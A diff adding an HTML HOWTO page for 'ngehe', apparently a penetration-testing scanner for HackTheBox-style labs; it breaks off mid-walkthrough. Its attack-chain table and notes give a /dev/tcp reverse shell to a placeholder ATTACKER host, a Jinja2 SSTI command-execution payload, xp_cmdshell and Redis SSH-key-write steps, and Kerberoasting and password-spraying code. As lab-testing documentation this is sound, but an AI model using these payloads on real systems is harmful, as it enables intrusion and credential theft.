@@ -1,0 +1,786 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>ngehe — HOWTO</title>
+  <meta name="description" content="ngehe practical walkthrough: install, recon, scan, HTB workflows from finding to root.txt." />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet" />
+  <style>
+    :root {
+      --bg: #0b0f14;
+      --bg-2: #0f141c;
+      --panel: #121925;
+      --panel-2: #182232;
+      --border: #1f2a3a;
+      --text: #e6edf3;
+      --muted: #8b98a5;
+      --accent: #7ee787;
+      --accent-2: #58a6ff;
+      --warn: #f0883e;
+      --crit: #ff7b72;
+      --code-bg: #0a0e14;
+    }
+    * { box-sizing: border-box; }
+    html, body {
+      margin: 0; padding: 0;
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Inter', system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
+      font-size: 16px;
+      line-height: 1.65;
+      -webkit-font-smoothing: antialiased;
+    }
+    code, pre, .mono { font-family: 'JetBrains Mono', ui-monospace, SFMono-Regular, Menlo, monospace; }
+    a { color: var(--accent-2); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    .container { max-width: 1080px; margin: 0 auto; padding: 0 24px; }
+
+    nav {
+      position: sticky; top: 0; z-index: 10;
+      background: rgba(11,15,20,0.85);
+      backdrop-filter: blur(8px);
+      border-bottom: 1px solid var(--border);
+    }
+    nav .container { display: flex; align-items: center; justify-content: space-between; padding-top: 14px; padding-bottom: 14px; }
+    nav .brand { font-weight: 800; font-size: 18px; letter-spacing: -0.01em; }
+    nav .brand a { color: var(--text); }
+    nav .brand span { color: var(--accent); }
+    nav ul { list-style: none; margin: 0; padding: 0; display: flex; gap: 22px; }
+    nav ul a { color: var(--muted); font-weight: 500; font-size: 14px; }
+    nav ul a:hover { color: var(--text); text-decoration: none; }
+    nav ul a.active { color: var(--accent); }
+
+    /* layout: TOC sidebar + content */
+    .layout {
+      display: grid;
+      grid-template-columns: 240px 1fr;
+      gap: 48px;
+      padding: 56px 0 80px;
+    }
+    @media (max-width: 920px) { .layout { grid-template-columns: 1fr; gap: 24px; } .toc { position: static !important; } }
+
+    .toc {
+      position: sticky; top: 80px; align-self: start;
+      max-height: calc(100vh - 100px);
+      overflow-y: auto;
+      font-size: 13px;
+    }
+    .toc h4 {
+      color: var(--muted); text-transform: uppercase; letter-spacing: 0.08em;
+      font-size: 11px; font-weight: 700; margin: 0 0 12px;
+    }
+    .toc ol { list-style: none; padding: 0; margin: 0; counter-reset: toc; }
+    .toc ol li { counter-increment: toc; margin: 0; }
+    .toc ol > li > a { display: block; padding: 6px 0 6px 22px; color: var(--muted); position: relative; }
+    .toc ol > li > a::before { content: counter(toc) "."; position: absolute; left: 0; color: var(--border); font-family: 'JetBrains Mono', monospace; }
+    .toc a:hover { color: var(--text); text-decoration: none; }
+
+    .content { min-width: 0; }
+    .content h1 { font-size: 44px; letter-spacing: -0.02em; font-weight: 800; line-height: 1.1; margin: 0 0 14px; }
+    .content .pill {
+      display: inline-block; padding: 4px 12px; border-radius: 999px;
+      background: rgba(126,231,135,0.1); color: var(--accent);
+      border: 1px solid rgba(126,231,135,0.25);
+      font-size: 12px; font-weight: 600; letter-spacing: 0.04em; text-transform: uppercase;
+      margin-bottom: 18px;
+    }
+    .content .lede { font-size: 18px; color: var(--muted); margin: 0 0 36px; max-width: 720px; }
+
+    .content h2 {
+      font-size: 28px; letter-spacing: -0.02em; font-weight: 800;
+      margin: 64px 0 12px; padding-top: 16px;
+      border-top: 1px solid var(--border);
+    }
+    .content h2:first-of-type { border-top: none; padding-top: 0; margin-top: 0; }
+    .content h3 { font-size: 19px; font-weight: 700; margin: 32px 0 10px; }
+    .content h4 { font-size: 15px; font-weight: 700; margin: 22px 0 8px; color: var(--text); }
+
+    .content p { margin: 0 0 16px; color: var(--text); }
+    .content p.muted { color: var(--muted); }
+    .content ul, .content ol { margin: 0 0 18px; padding-left: 22px; }
+    .content li { margin-bottom: 6px; }
+    .content li strong { color: var(--text); }
+    .content code {
+      background: rgba(255,255,255,0.06);
+      padding: 1px 6px; border-radius: 4px;
+      font-size: 13px; color: var(--accent);
+    }
+    .content a code { color: var(--accent-2); }
+
+    pre {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 16px 18px;
+      overflow-x: auto;
+      font-size: 13.5px;
+      line-height: 1.55;
+      margin: 0 0 18px;
+    }
+    pre code { background: transparent; padding: 0; color: var(--text); font-size: 13.5px; }
+    .cmt { color: #6c7682; }
+    .kw  { color: #ff7b72; }
+    .str { color: #a5d6ff; }
+    .ok  { color: var(--accent); }
+
+    .codecard {
+      background: var(--code-bg);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      overflow: hidden;
+      margin: 0 0 18px;
+    }
+    .codecard .filename {
+      padding: 8px 14px;
+      background: var(--panel-2);
+      border-bottom: 1px solid var(--border);
+      color: var(--muted);
+      font-size: 12px;
+      font-family: 'JetBrains Mono', monospace;
+    }
+    .codecard pre { border: none; border-radius: 0; margin: 0; }
+
+    .table-wrap { overflow-x: auto; border: 1px solid var(--border); border-radius: 10px; margin: 0 0 24px; }
+    table { width: 100%; border-collapse: collapse; font-size: 13.5px; }
+    th, td { padding: 11px 14px; text-align: left; border-bottom: 1px solid var(--border); vertical-align: top; }
+    th { background: var(--panel-2); font-weight: 600; color: var(--muted); font-size: 11px; text-transform: uppercase; letter-spacing: 0.04em; }
+    tr:last-child td { border-bottom: none; }
+    td code { color: var(--accent); background: transparent; padding: 0; }
+
+    .callout {
+      border-radius: 10px;
+      padding: 16px 20px;
+      margin: 0 0 22px;
+      border: 1px solid var(--border);
+      background: var(--panel);
+    }
+    .callout.warn { background: rgba(240,136,62,0.06); border-color: rgba(240,136,62,0.3); }
+    .callout.warn strong { color: var(--warn); }
+    .callout.info { background: rgba(88,166,255,0.06); border-color: rgba(88,166,255,0.3); }
+    .callout.info strong { color: var(--accent-2); }
+
+    .hr-soft { border: 0; border-top: 1px solid var(--border); margin: 48px 0; }
+
+    .step-num {
+      display: inline-block;
+      background: var(--accent);
+      color: #0b0f14;
+      width: 26px; height: 26px;
+      border-radius: 6px;
+      font-family: 'JetBrains Mono', monospace;
+      font-weight: 700;
+      text-align: center;
+      line-height: 26px;
+      font-size: 13px;
+      margin-right: 8px;
+      vertical-align: -3px;
+    }
+
+    footer { padding: 30px 0 60px; color: var(--muted); font-size: 14px; border-top: 1px solid var(--border); margin-top: 40px; }
+    footer .row { display: flex; flex-wrap: wrap; gap: 24px; justify-content: space-between; align-items: center; }
+    footer ul { list-style: none; padding: 0; margin: 0; display: flex; gap: 18px; }
+  </style>
+</head>
+<body>
+
+<nav>
+  <div class="container">
+    <div class="brand"><a href="./">ngehe<span>_</span></a></div>
+    <ul>
+      <li><a href="./#features">Features</a></li>
+      <li><a href="./#commands">Commands</a></li>
+      <li><a href="./#detectors">Detectors</a></li>
+      <li><a href="./howto.html" class="active">HOWTO</a></li>
+      <li><a href="https://github.com/chud-lori/ngehe">GitHub</a></li>
+    </ul>
+  </div>
+</nav>
+
+<div class="container">
+  <div class="layout">
+
+    <aside class="toc">
+      <h4>On this page</h4>
+      <ol>
+        <li><a href="#prerequisites">Prerequisites</a></li>
+        <li><a href="#workflow">HTB / Box workflow</a></li>
+        <li><a href="#chain">From finding to box</a></li>
+        <li><a href="#reading">Reading findings</a></li>
+        <li><a href="#scanners">Non-web scanner notes</a></li>
+        <li><a href="#detectors">Per-detector notes</a></li>
+        <li><a href="#ci">CI integration</a></li>
+        <li><a href="#walkthroughs">Worked HTB walkthroughs</a></li>
+        <li><a href="#demo">End-to-end demo</a></li>
+        <li><a href="#troubleshooting">Troubleshooting</a></li>
+      </ol>
+    </aside>
+
+    <article class="content">
+
+      <span class="pill">HOWTO · v0.4</span>
+      <h1>Practical walkthrough</h1>
+      <p class="lede">
+        Install ngehe, scan an HTB box from cold IP, and chain the findings to <code>root.txt</code>.
+        Pairs with the <a href="./">overview page</a>, which covers what ngehe is and which detectors ship.
+      </p>
+
+      <div class="callout warn">
+        <strong>Authorized use only.</strong> ngehe sends real attack payloads (SQLi markers, command-injection probes, traversal sequences, JWT manipulation, password sprays). Use only against systems you own, have written permission to test, or that are explicitly designed as CTF / HTB targets.
+      </div>
+
+      <h2 id="prerequisites">Prerequisites</h2>
+      <ul>
+        <li><strong>Go 1.22+</strong> to build from source.</li>
+        <li><strong>nmap</strong> on PATH (<code>ngehe box</code> shells out to it).</li>
+        <li>A target you are authorized to test (your own app, HTB / TryHackMe / PortSwigger lab, or a CTF box).</li>
+      </ul>
+
+      <p>Easiest install — the bundled <code>install.sh</code> handles <code>nmap</code> and the build:</p>
+
+<pre><span class="ok">$</span> git clone https://github.com/chud-lori/ngehe.git
+<span class="ok">$</span> cd ngehe
+<span class="ok">$</span> sudo ./install.sh        <span class="cmt"># /usr/local/bin</span>
+<span class="cmt"># or</span>
+<span class="ok">$</span> PREFIX=$HOME/.local ./install.sh   <span class="cmt"># ~/.local/bin</span>
+
+<span class="ok">$</span> ngehe doctor            <span class="cmt"># verify required deps are present</span></pre>
+
+      <p>Recommended companion tools (ngehe hands off to these — install separately):</p>
+      <ul>
+        <li><strong>hashcat</strong> — crack the JWT / <code>krb5asrep</code> / <code>krb5tgs</code> hashes ngehe produces.</li>
+        <li><strong>sqlmap</strong> — once ngehe flags <code>sqli-error-based</code> or <code>sqli-time-based</code>, sqlmap takes it from there.</li>
+        <li><strong>BloodHound</strong> — ingest ngehe's <code>users.json</code> / <code>computers.json</code> / <code>groups.json</code> for AD path analysis.</li>
+        <li><strong>impacket</strong> — heavier AS-REP / Kerberoast / NTLM relay than ngehe's MVP versions.</li>
+      </ul>
+
+      <h2 id="workflow">The HTB / box workflow</h2>
+      <p>This is the order ngehe is designed to run in for a fresh target.</p>
+
+      <h3><span class="step-num">0</span> Full-spectrum box scan</h3>
+      <p>If you have just an IP, start here:</p>
+<pre><span class="ok">$</span> ngehe box --target 10.10.11.5 --domain target.htb --markdown box.md</pre>
+
+      <p>What it does:</p>
+      <ol>
+        <li>Shells out to <code>nmap</code> with the <strong>quick</strong> profile by default (<code>-sV --top-ports 100 -Pn -T4</code>). Use <code>--profile full</code> for all ports, or <code>--profile service</code> for <code>-sV -sC -p-</code> (slow but thorough).</li>
+        <li>For each open port nmap identifies a service for, dispatches to a per-service scanner:
+          <ul>
+            <li><strong>SSH</strong> → banner + version-based CVE hints + auth method enumeration</li>
+            <li><strong>FTP</strong> → anonymous login + listing</li>
+            <li><strong>SMB</strong> → null / anonymous / guest enumeration + share list</li>
+            <li><strong>LDAP</strong> → anonymous bind + Root DSE + user list + AS-REP-roastable accounts</li>
+            <li><strong>SNMP</strong> → 32 common community strings</li>
+            <li><strong>DNS</strong> → AXFR zone transfer + ~200 subdomain bruteforce (requires <code>--domain</code>)</li>
+            <li><strong>MySQL / Postgres / MSSQL / Redis</strong> → default credential check + version capture</li>
+            <li><strong>HTTP / HTTPS / http-alt</strong> → runs the full <code>ngehe recon</code> flow</li>
+          </ul>
+        </li>
+        <li>Aggregates all findings into one JSONL + markdown report.</li>
+      </ol>
+
+      <h4>Useful flags</h4>
+<pre>--profile full          <span class="cmt"># nmap -p- (all 65k ports, takes much longer)</span>
+--profile service       <span class="cmt"># nmap -sV -sC -p- (very thorough)</span>
+--top 500               <span class="cmt"># wordlist depth for web recon / DNS / vhost</span>
+--no-web                <span class="cmt"># skip web recon (faster, non-HTTP services only)</span>
+--domain target.htb     <span class="cmt"># required for DNS subdomain bruteforce</span></pre>
+
+      <h4>Reading the output</h4>
+<pre><span class="cmt"># Critical + high findings only</span>
+<span class="ok">$</span> jq <span class="str">'select(.severity == "critical" or .severity == "high")'</span> box.jsonl
+
+<span class="cmt"># What services are open</span>
+<span class="ok">$</span> jq -r <span class="str">'select(.rule == "port-open") | .url'</span> box.jsonl
+
+<span class="cmt"># Any default creds?</span>
+<span class="ok">$</span> jq <span class="str">'select(.rule | test("default-creds"))'</span> box.jsonl</pre>
+
+      <h3><span class="step-num">1</span> Recon</h3>
+      <p>You usually start with just an IP and an open port. Get a snapshot of what's running.</p>
+<pre><span class="ok">$</span> ngehe recon --target http://10.10.11.5 --markdown recon.md</pre>
+      <p>What it does:</p>
+      <ol>
+        <li><strong>Tech fingerprint.</strong> Reads <code>Server</code>, <code>X-Powered-By</code>, cookies, and body markers to identify the stack.</li>
+        <li><strong>Sensitive files.</strong> Probes for <code>.git/HEAD</code>, <code>.env</code>, AWS credentials, <code>phpinfo</code>, <code>server-status</code>, backups, swagger docs. Uses <strong>content fingerprinting</strong> so a catch-all router can't fake a positive.</li>
+        <li><strong>Directory bruteforce.</strong> Walks the SecLists <code>common.txt</code> wordlist (4750 entries). 401/403 paths are upgraded to MEDIUM — real endpoints that require auth.</li>
+      </ol>
+
+      <h3><span class="step-num">2</span> Browse + capture</h3>
+      <p>Open the box's web app in a browser proxied through Burp / mitmproxy / Chrome DevTools. Click around, log in, do a few real flows. Export to HAR.</p>
+      <ul>
+        <li><strong>Chrome DevTools:</strong> Network tab → "Preserve log" → right-click → "Save all as HAR with content".</li>
+        <li><strong>mitmproxy:</strong> <code>mitmproxy --listen-port 8080 --set hardump=capture.har</code>.</li>
+      </ul>
+      <p>The richer the HAR, the better ngehe's findings — every captured request becomes an injection target.</p>
+
+      <h3><span class="step-num">3</span> Configure</h3>
+<pre><span class="ok">$</span> ngehe init --out ngehe.yaml</pre>
+      <p>A complete config for an HTB box:</p>
+
+      <div class="codecard">
+        <div class="filename">ngehe.yaml</div>
+<pre>scope:
+  hosts:
+    - 10.10.11.5
+  include_paths:
+    - /
+  exclude_paths:
+    - /assets/
+    - /static/
+    - /api/health
+  methods: [GET, POST, PUT, PATCH, DELETE]
+
+sessions:
+  - name: alice
+    login:
+      method: POST
+      url: http://10.10.11.5/login
+      content_type: application/x-www-form-urlencoded
+      body: 'username=alice&password=alice123'
+      token_jsonpath: token
+  - name: bob
+    bearer: eyJhbGciOi...
+
+replay:
+  concurrency: 4
+  include_anon: true
+  timeout_ms: 10000
+
+detectors:
+  bola: true
+  id_mutation: true
+  mass_assign: true
+  jwt_abuse: true
+  sqli: true
+  cmd_injection: true
+  ssti: true
+  lfi: true
+  ssrf: true
+  xss: true
+  default_creds: true
+  jwt_probe_url: http://10.10.11.5/api/me
+  default_creds_urls:
+    - http://10.10.11.5/admin/login|user=username,password=password</pre>
+      </div>
+
+      <ul>
+        <li><strong><code>scope.hosts</code></strong> is the safety boundary. ngehe refuses to send requests to hosts not listed here.</li>
+        <li><strong>Sessions</strong> can use <code>bearer:</code> (direct token) or <code>login:</code> (ngehe performs login at scan start, extracts a token via <code>token_jsonpath</code>).</li>
+        <li><strong><code>jwt_probe_url</code></strong> is a small idempotent authenticated endpoint ngehe fires JWT abuse checks against. Pick one that returns clean 2xx on a valid token and 401 on an invalid one.</li>
+        <li><strong><code>default_creds_urls</code></strong> pipe-syntax modifier customizes field names + JSON mode:
+          <ul>
+            <li><code>http://host/login</code> — default form fields <code>username</code>/<code>password</code></li>
+            <li><code>http://host/login|user=email,password=passwd</code> — custom field names</li>
+            <li><code>http://host/api/login|user=email,password=passwd,json</code> — JSON body</li>
+          </ul>
+        </li>
+      </ul>
+
+      <h3><span class="step-num">4</span> Active scan</h3>
+<pre><span class="ok">$</span> ngehe scan \
+    --har capture.har \
+    --config ngehe.yaml \
+    --out findings.jsonl \
+    --markdown findings.md</pre>
+
+      <p>Progress reports to stderr per detector:</p>
+<pre>loaded 47 in-scope requests
+loaded 2 sessions
+bola: 6 findings
+id-mutation: 3 findings
+mass-assign: 11 findings
+jwt-abuse: 4 findings
+sqli: 1 findings
+cmdi: 1 findings
+ssti: 0 findings
+lfi: 1 findings
+ssrf: 0 findings
+xss: 2 findings
+default-creds: 1 findings
+total: 30 findings</pre>
+
+      <h2 id="chain">From finding to box: the attack chain</h2>
+      <p>ngehe identifies vulnerabilities. <strong>It does not chain them to root automatically</strong> — that's still your job, but every finding ships with an actionable <code>next</code> field telling you the concrete payload or command.</p>
+      <p>Open <code>findings.md</code>. The top of the report has a <strong>"Suggested attack chain"</strong> section ordered by exploitability. Typical chains by finding type:</p>
+
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr><th style="width:280px">Finding</th><th>Chain to root</th></tr>
+          </thead>
+          <tbody>
+            <tr><td><code>cmdi-marker</code> / <code>cmdi-time-based</code></td><td>RCE → reverse shell with <code>nc -lvnp 4444</code> + <code>;bash -c "bash -i &gt;&amp;/dev/tcp/ATTACKER/4444 0&gt;&amp;1"</code></td></tr>
+            <tr><td><code>ssti</code></td><td><code>{{config.__class__.__init__.__globals__['os'].popen('id').read()}}</code> → RCE → reverse shell</td></tr>
+            <tr><td><code>lfi-path-traversal</code></td><td>Read <code>/root/.ssh/id_rsa</code> for SSH foothold; or log poisoning + LFI → RCE</td></tr>
+            <tr><td><code>sqli-*</code></td><td><code>sqlmap -u "&lt;URL&gt;" --batch --dump</code>; MSSQL → try <code>xp_cmdshell</code></td></tr>
+            <tr><td><code>sensitive-file</code> (.git/HEAD)</td><td><code>git-dumper &lt;url&gt;/.git . &amp;&amp; grep -rE "(password|secret|token)" .</code></td></tr>
+            <tr><td><code>sensitive-file</code> (.env)</td><td>Read DB creds, <code>SECRET_KEY</code>, AWS keys directly</td></tr>
+            <tr><td><code>ssrf</code> (cloud metadata)</td><td>Pivot to AWS IAM creds: <code>/latest/meta-data/iam/security-credentials/&lt;role&gt;</code> → <code>aws-cli</code></td></tr>
+            <tr><td><code>default-credentials</code></td><td>Log in → admin pages with command-exec (Tomcat Manager deploy WAR) or file upload (webshell)</td></tr>
+            <tr><td><code>jwt-alg-none</code> / <code>jwt-weak-secret</code></td><td>Forge admin token → access privileged endpoints</td></tr>
+            <tr><td><code>mass-assign-reflected</code></td><td>Re-register / re-PUT with <code>"role":"admin"</code> to elevate</td></tr>
+            <tr><td><code>ftp-anonymous-allowed</code></td><td><code>wget -r ftp://anonymous@host/</code> — look for <code>id_rsa</code>, configs, backups</td></tr>
+            <tr><td><code>smb-null-session-allowed</code></td><td><code>enum4linux-ng -A host</code> for full enumeration</td></tr>
+            <tr><td><code>ldap-asrep-roastable</code></td><td><code>hashcat -m 18200 hash.txt rockyou.txt</code></td></tr>
+            <tr><td><code>kerberos-asrep-roast</code> / <code>kerberos-kerberoast</code></td><td><code>hashcat -m 18200</code> / <code>-m 13100</code> against rockyou</td></tr>
+            <tr><td><code>bloodhound-collect</code></td><td>Open BloodHound CE → ingest → "Shortest paths to Domain Admins"</td></tr>
+            <tr><td><code>db-no-auth-redis</code></td><td>Write SSH key via Redis <code>CONFIG SET</code> → SSH in as root</td></tr>
+            <tr><td><code>db-default-creds-mssql</code></td><td><code>EXEC xp_cmdshell 'whoami'</code> for OS RCE</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <p><code>jq</code> filter to see just the chain candidates:</p>
+<pre><span class="ok">$</span> jq -r <span class="str">'select(.severity == "critical" or .severity == "high") | "[\(.severity)] \(.rule)\n  url: \(.url)\n  next: \(.next)\n"'</span> findings.jsonl</pre>
+
+      <h2 id="reading">Reading findings</h2>
+      <p>JSONL fields:</p>
+<pre>{
+  <span class="kw">"rule"</span>: <span class="str">"sqli-error-based"</span>,
+  <span class="kw">"severity"</span>: <span class="str">"high"</span>,
+  <span class="kw">"method"</span>: <span class="str">"GET"</span>,
+  <span class="kw">"url"</span>: <span class="str">"http://10.10.11.5/api/search?q=%27"</span>,
+  <span class="kw">"path"</span>: <span class="str">"/api/search"</span>,
+  <span class="kw">"param"</span>: <span class="str">"query:q"</span>,
+  <span class="kw">"payload"</span>: <span class="str">"'"</span>,
+  <span class="kw">"evidence"</span>: <span class="str">"SQLite error: unrecognized token"</span>,
+  <span class="kw">"why"</span>: <span class="str">"payload triggered a database error string in the response"</span>
+}</pre>
+
+      <p>Filter for what matters:</p>
+<pre><span class="cmt"># Critical + high only</span>
+<span class="ok">$</span> jq <span class="str">'select(.severity == "critical" or .severity == "high")'</span> findings.jsonl
+
+<span class="cmt"># One line per finding, grouped</span>
+<span class="ok">$</span> jq -r <span class="str">'"\(.severity)\t\(.rule)\t\(.method) \(.path)\t\(.param)"'</span> findings.jsonl \
+    | sort -u
+
+<span class="cmt"># Just the rules that fired</span>
+<span class="ok">$</span> jq -r .rule findings.jsonl | sort | uniq -c | sort -rn</pre>
+
+      <h2 id="scanners">Non-web scanner notes (<code>ngehe box</code>)</h2>
+
+      <h3>SSH</h3>
+      <p><code>ngehe box</code> flags known-vulnerable OpenSSH and libssh versions from the banner.</p>
+      <ul>
+        <li><strong><code>ssh-libssh-auth-bypass</code></strong> — libssh ≤ 0.8.3, CVE-2018-10933, complete auth bypass. Critical.</li>
+        <li><strong><code>ssh-cve-2018-15473</code></strong> — OpenSSH ≤ 7.7 username enumeration. Use the leaked user list with <code>kerbrute</code> / hydra.</li>
+        <li><strong><code>ssh-auth-methods</code></strong> — what auth modes the server accepts. <code>publickey</code> only = you need a leaked key.</li>
+        <li><strong><code>ssh-none-auth-allowed</code></strong> — fire-and-forget critical: anyone can log in.</li>
+      </ul>
+
+      <h3>FTP</h3>
+      <p><code>ftp-anonymous-allowed</code> plus <code>ftp-anonymous-listing</code> are the gold finds. If you see a writable directory and the FTP root is web-served, try uploading a web shell.</p>
+
+      <h3>SMB</h3>
+      <p>Tries null / anonymous / guest sessions with <code>go-smb2</code>. A working session lists shares. <strong>Does not currently do SMB version detection beyond what nmap provides</strong> — for MS17-010 / EternalBlue era boxes, run <code>nmap --script smb-vuln-ms17-010</code> separately.</p>
+
+      <h3>LDAP</h3>
+      <ul>
+        <li><strong><code>ldap-root-dse</code></strong> — domain controller info: hostname, naming context, functional level. Tells you the realm for Kerberos attacks.</li>
+        <li><strong><code>ldap-user-enum</code></strong> — full domain user list. Save as <code>users.txt</code> and feed to AS-REP roast / spray / kerberoast.</li>
+        <li><strong><code>ldap-asrep-roastable</code></strong> — accounts with <code>DONT_REQ_PREAUTH</code>. Immediately AS-REP roastable without credentials.</li>
+      </ul>
+
+      <h3>Kerberos (AS-REP roast + Kerberoast)</h3>
+      <p>Go primitives in <code>internal/scanner/kerberos/</code>. Calling pattern:</p>
+<pre><span class="cmt">// AS-REP roast — no creds required.</span>
+hashes := kerberos.<span class="ok">ASREPRoast</span>(kdcHost, <span class="str">"CORP.LOCAL"</span>, []string{<span class="str">"alice"</span>, <span class="str">"bob"</span>, <span class="str">"svc.web"</span>})
+
+<span class="cmt">// Kerberoast — requires a valid (low-priv) domain account.</span>
+hashes := kerberos.<span class="ok">Kerberoast</span>(kdcHost, <span class="str">"CORP.LOCAL"</span>, <span class="str">"alice"</span>, <span class="str">"Password123!"</span>,
+    []string{<span class="str">"HTTP/web.corp.local"</span>, <span class="str">"MSSQLSvc/sql.corp.local:1433"</span>})</pre>
+
+      <p>Hashes emit in <strong>hashcat format</strong>: <code>$krb5asrep$23$...</code> (mode 18200) and <code>$krb5tgs$23$*...*$...$...</code> (mode 13100). Feed to <code>hashcat -m 18200 hashes.txt rockyou.txt</code> (or <code>-m 13100</code>).</p>
+
+      <h3>BloodHound collection</h3>
+<pre>findings, _ := bloodhound.<span class="ok">Collect</span>(bloodhound.Options{
+    Host:   <span class="str">"10.10.11.5"</span>,
+    User:   <span class="str">"alice"</span>,
+    Pass:   <span class="str">"Password123!"</span>,
+    Domain: <span class="str">"corp.local"</span>,
+    OutDir: <span class="str">"./bh-zip"</span>,
+})</pre>
+      <p>Output: <code>users.json</code>, <code>computers.json</code>, <code>groups.json</code> in BloodHound schema v5. This is a <strong>subset</strong> of SharpHound — no ACLs, no sessions, no local-admin enumeration. For deeper collection use SharpHound (Windows) or bloodhound-python.</p>
+
+      <h3>Databases</h3>
+      <p><code>db-default-creds-*</code> and <code>db-no-auth-redis</code> are the wins. After a hit:</p>
+      <ul>
+        <li><strong>MySQL / Postgres:</strong> read <code>information_schema</code> / <code>pg_user</code>, look for app secrets.</li>
+        <li><strong>MSSQL:</strong> try <code>xp_cmdshell</code> for RCE — <code>EXEC xp_cmdshell 'whoami'</code>.</li>
+        <li><strong>Redis:</strong> <code>CONFIG SET dir</code>, <code>CONFIG SET dbfilename</code>, then <code>SAVE</code> — classic SSH key write to <code>authorized_keys</code> for RCE.</li>
+      </ul>
+
+      <h3>NTLM password spray</h3>
+<pre>ntlm.<span class="ok">Spray</span>(<span class="str">"http://target/api/protected"</span>, <span class="str">"CORP"</span>,
+    []string{<span class="str">"alice"</span>,<span class="str">"bob"</span>}, []string{<span class="str">"Spring2026!"</span>,<span class="str">"Summer2026!"</span>})</pre>
+      <div class="callout warn"><strong>Lockout caution:</strong> many AD policies lock at 5 failures. Test carefully.</div>
+
+      <h2 id="detectors">Per-detector notes</h2>
+
+      <h3>BOLA / id-mutation / broken-auth</h3>
+      <p>You need <strong>at least two sessions</strong> for BOLA. With one session ngehe still runs id-mutation. Body-similarity score interpretation:</p>
+      <ul>
+        <li><strong>≥ 0.6</strong>: same resource — strong BOLA evidence.</li>
+        <li><strong>0.2 – 0.6</strong>: partial overlap — could be a shared listing endpoint (review).</li>
+        <li><strong>&lt; 0.2</strong>: only structural similarity — likely a per-user endpoint, demoted to LOW.</li>
+      </ul>
+
+      <h3>Mass-assignment</h3>
+      <p><code>mass-assign-reflected</code> (HIGH) is what you want — server echoed an injected <code>isAdmin</code>/<code>role</code>/<code>owner</code>. <code>mass-assign-accepted</code> (LOW) just means the request wasn't rejected. <strong>Confirm by fetching the resource and inspecting its full state</strong> after a "successful" inject.</p>
+
+      <h3>JWT abuse</h3>
+      <p>Each rule names the specific trust failure (alg=none, weak secret, no exp/iss/aud check). If <code>jwt_probe_url</code> is wrong (e.g., doesn't require auth) every tampered token will "pass" — verify the URL returns 401 for an invalid token first.</p>
+
+      <h3>SQLi / CMDi / SSTI / LFI / SSRF / XSS</h3>
+      <p>These inject payloads into every query parameter and JSON string field of every captured request.</p>
+      <ul>
+        <li><strong>SQLi time-based</strong> can be slow — each candidate parameter waits ~5s.</li>
+        <li><strong>CMDi-marker</strong> is baseline-aware: first sends a non-shell-meta marker per param and skips that param if it reflects, so echo endpoints don't false-positive.</li>
+        <li><strong>SSTI</strong> marker is <code>1337*1331 → 1779547</code>; if that exact digit string is anywhere in normal responses, the param is skipped.</li>
+        <li><strong>LFI</strong> covers Linux + macOS <code>/etc/passwd</code> plus Windows <code>win.ini</code> and PHP <code>php://filter</code> wrappers.</li>
+        <li><strong>SSRF</strong> probes cloud metadata (AWS, GCP, Azure) plus <code>file://</code>, loopback HTTP, gopher, dict.</li>
+        <li><strong>XSS</strong> is reflected-only; DOM XSS isn't covered.</li>
+      </ul>
+
+      <h3>Default credentials</h3>
+      <p>Spec each login URL in <code>detectors.default_creds_urls</code>. ngehe tries 33 curated web-admin credentials by default. Pipe-syntax for less-common forms:</p>
+<pre>default_creds_urls:
+  - http://target/login|user=email,password=passwd,json</pre>
+
+      <h2 id="ci">CI integration</h2>
+      <p>Fail the build on any HIGH or CRITICAL finding:</p>
+<pre><span class="ok">$</span> ngehe scan --har $CAPTURE --config ngehe.yaml --out findings.jsonl
+<span class="ok">$</span> HIGH=$(jq -c <span class="str">'select(.severity == "high" or .severity == "critical")'</span> findings.jsonl | wc -l)
+<span class="ok">$</span> if [ <span class="str">"$HIGH"</span> -gt 0 ]; then
+    echo <span class="str">"ngehe found $HIGH critical/high-severity issues"</span>
+    exit 1
+  fi</pre>
+      <div class="callout info"><strong>Keep secrets out of CI.</strong> Capture files and tokens contain real credentials. Generate them from short-lived test creds inside the CI environment.</div>
+
+      <h2 id="walkthroughs">Worked HTB walkthroughs</h2>
+      <p>Two end-to-end scenarios that show how ngehe's output maps to an actual box-pwning workflow. Both are realistic composites of common HTB patterns, not specific boxes (no spoilers).</p>
+
+      <h3>Walkthrough 1 — Web Linux box (SSTI → user → SUID → root)</h3>
+      <p>You spawn an HTB box at <code>10.10.11.42</code>. Add it to <code>/etc/hosts</code> as <code>box.htb</code>.</p>
+
+      <h4>Step 1 — full-spectrum scan</h4>
+<pre><span class="ok">$</span> ngehe box --target 10.10.11.42 --domain box.htb \
+    --profile quick --markdown box.md --top 800</pre>
+
+<pre>ngehe box → 10.10.11.42 (profile=quick)
+running: nmap -T4 -Pn --open -sV -oX - --top-ports 100 10.10.11.42
+port-scan: 3 open services
+tcp/22 ssh                     → 2 findings
+tcp/80 http                    → 47 findings
+tcp/53 domain                  → 1 findings
+total: 50 findings</pre>
+
+      <h4>Step 2 — read the attack chain at the top of <code>box.md</code></h4>
+      <div class="codecard">
+        <div class="filename">box.md</div>
+<pre><span class="kw">## Suggested attack chain</span>
+
+<span class="kw">1.</span> [CRITICAL] ssti — GET /api/render
+   param: query:msg  payload: {{1337*1331}}
+   evidence: Jinja2/Twig/Liquid evaluated 1337*1331 → 1779547
+
+   RCE via template. Engine identified in evidence — chain to OS:
+     Jinja2: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+
+<span class="kw">2.</span> [HIGH] sensitive-file — GET /.env
+   evidence: 88 bytes; preview: "DATABASE_URL=postgres://app:hunter2@localhost/app
+                                 SECRET_KEY=super-secret"
+
+<span class="kw">3.</span> [HIGH] dns-axfr-allowed — TCP dns://10.10.11.42:53/box.htb.
+   evidence: dev.box.htb. IN A 10.10.11.42 / admin.box.htb. IN A 10.10.11.42</pre>
+      </div>
+
+      <h4>Step 3 — confirm SSTI RCE</h4>
